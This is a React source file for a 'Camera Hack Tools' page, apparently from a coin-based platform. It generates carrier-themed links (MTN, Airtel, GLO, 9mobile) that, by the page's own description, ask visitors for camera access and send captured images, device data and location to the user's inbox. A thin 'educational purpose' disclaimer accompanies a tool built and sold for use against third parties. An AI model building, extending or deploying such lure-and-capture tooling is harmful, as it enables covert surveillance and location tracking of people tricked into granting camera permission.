import { useState } from 'react';
import Layout from '@/components/Layout';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { Camera, ExternalLink, Coins, Shield, Smartphone } from 'lucide-react';
import { useToast } from '@/hooks/use-toast';

const CameraHack = () => {
  const [userCoins, setUserCoins] = useState(
    JSON.parse(localStorage.getItem('currentUser') || '{}').coins || 0
  );
  const { toast } = useToast();

  const carriers = [
    { name: 'MTN', color: 'bg-yellow-500', icon: '📱' },
    { name: 'Airtel', color: 'bg-red-500', icon: '📞' },
    { name: 'GLO', color: 'bg-green-500', icon: '🌐' },
    { name: '9mobile', color: 'bg-green-600', icon: '📶' }
  ];

  const handleCarrierClick = (carrier: string) => {
    if (userCoins < 3) {
      toast({
        title: 'Insufficient Coins',
        description: 'You need 3 coins to access camera hack tools. Please top up your account.',
        variant: 'destructive'
      });
      return;
    }

    // Deduct coins
    const currentUser = JSON.parse(localStorage.getItem('currentUser') || '{}');
    const updatedUser = {
      ...currentUser,
      coins: currentUser.coins - 3,
      transactions: [
        ...(currentUser.transactions || []),
        {
          description: `Accessed ${carrier} camera hack tool`,
          amount: -3,
          timestamp: Date.now()
        }
      ]
    };
    
    localStorage.setItem('currentUser', JSON.stringify(updatedUser));
    localStorage.setItem(`user_${currentUser.id}`, JSON.stringify(updatedUser));
    setUserCoins(updatedUser.coins);

    // Generate the actual camera hack page URL
    const baseUrl = window.location.origin;
    const cameraUrl = `${baseUrl}/cam/${carrier.toLowerCase()}/${currentUser.id}`;
    
    toast({
      title: 'Tool Activated',
      description: `${carrier} camera hack page generated successfully. 3 coins deducted.`
    });

    // Copy URL to clipboard and show it
    navigator.clipboard.writeText(cameraUrl);
    
    // Show the generated URL
    setTimeout(() => {
      alert(`Camera Hack URL Generated:\n\n${cameraUrl}\n\nURL copied to clipboard!`);
    }, 500);
  };

  return (
    <Layout>
      <div className="space-y-6">
        <div className="text-center">
          <h1 className="text-3xl font-bold text-white mb-2">Camera Hack Tools</h1>
          <p className="text-gray-400">Mobile carrier-based camera capture tools</p>
        </div>

        {/* Cost Warning */}
        <Card className="bg-red-900/20 border-red-500/50 backdrop-blur">
          <CardContent className="p-6">
            <div className="flex items-start gap-3">
              <Shield className="h-6 w-6 text-red-400 mt-1 flex-shrink-0" />
              <div>
                <h3 className="text-lg font-semibold text-red-400 mb-2">Tool Cost & Disclaimer</h3>
                <div className="space-y-2 text-gray-300">
                  <p className="flex items-center gap-2">
                    <Coins className="h-4 w-4 text-yellow-400" />
                    Each carrier tool costs <strong>3 coins</strong> to activate
                  </p>
                  <p className="flex items-center gap-2">
                    <Camera className="h-4 w-4 text-blue-400" />
                    Generated pages capture device camera with permission
                  </p>
                  <p className="text-sm text-yellow-300 bg-yellow-900/20 p-2 rounded">
                    <strong>Educational Purpose:</strong> These tools are for cybersecurity education and awareness training only.
                  </p>
                </div>
              </div>
            </div>
          </CardContent>
        </Card>

        {/* Current Balance */}
        <Card className="bg-gradient-to-r from-blue-600 to-purple-600 border-0">
          <CardContent className="p-4">
            <div className="flex items-center justify-between">
              <span className="text-white">Your Balance:</span>
              <div className="flex items-center gap-2">
                <Coins className="h-5 w-5 text-yellow-400" />
                <span className="text-xl font-bold text-white">{userCoins} coins</span>
              </div>
            </div>
          </CardContent>
        </Card>

        {/* Carrier Grid */}
        <div className="grid grid-cols-2 md:grid-cols-4 gap-6">
          {carriers.map((carrier) => (
            <Card 
              key={carrier.name}
              className="bg-slate-800/50 border-slate-700 backdrop-blur hover:bg-slate-800/70 transition-all duration-300 hover:scale-105 cursor-pointer"
              onClick={() => handleCarrierClick(carrier.name)}
            >
              <CardContent className="p-6 text-center">
                <div className={`h-20 w-20 ${carrier.color} rounded-xl flex items-center justify-center mx-auto mb-4 text-3xl`}>
                  {carrier.icon}
                </div>
                <h3 className="text-white font-bold text-lg mb-2">{carrier.name}</h3>
                <Badge className="bg-red-500/20 text-red-400">
                  3 coins
                </Badge>
              </CardContent>
            </Card>
          ))}
        </div>

        {/* How It Works */}
        <Card className="bg-slate-800/50 border-slate-700 backdrop-blur">
          <CardHeader>
            <CardTitle className="text-white flex items-center gap-2">
              <Camera className="h-5 w-5" />
              How Camera Hack Tools Work
            </CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            <div className="grid md:grid-cols-2 gap-6">
              <div>
                <h4 className="text-blue-400 font-semibold mb-2">Process:</h4>
                <ol className="text-gray-300 space-y-1 text-sm">
                  <li>1. Select a mobile carrier above</li>
                  <li>2. 3 coins will be deducted from your balance</li>
                  <li>3. A carrier-specific camera page is generated</li>
                  <li>4. Page requests camera permission when visited</li>
                  <li>5. Captured images appear in your Inbox</li>
                </ol>
              </div>
              <div>
                <h4 className="text-green-400 font-semibold mb-2">Features:</h4>
                <ul className="text-gray-300 space-y-1 text-sm">
                  <li>• Carrier-themed interface design</li>
                  <li>• Automatic camera permission request</li>
                  <li>• High-quality image capture</li>
                  <li>• Device and location information</li>
                  <li>• Secure storage in your inbox</li>
                </ul>
              </div>
            </div>
            
            <div className="bg-amber-900/20 border border-amber-500/30 rounded-lg p-4 mt-4">
              <h4 className="text-amber-400 font-semibold mb-2 flex items-center gap-2">
                <Smartphone className="h-4 w-4" />
                Important Notes:
              </h4>
              <ul className="text-gray-300 space-y-1 text-sm">
                <li>• Camera access requires user permission on modern browsers</li>
                <li>• Pages work best on mobile devices</li>
                <li>• Educational demonstrations should include proper consent</li>
                <li>• All captured data is linked to your User ID</li>
              </ul>
            </div>
          </CardContent>
        </Card>
      </div>
    </Layout>
  );
};

export default CameraHack;
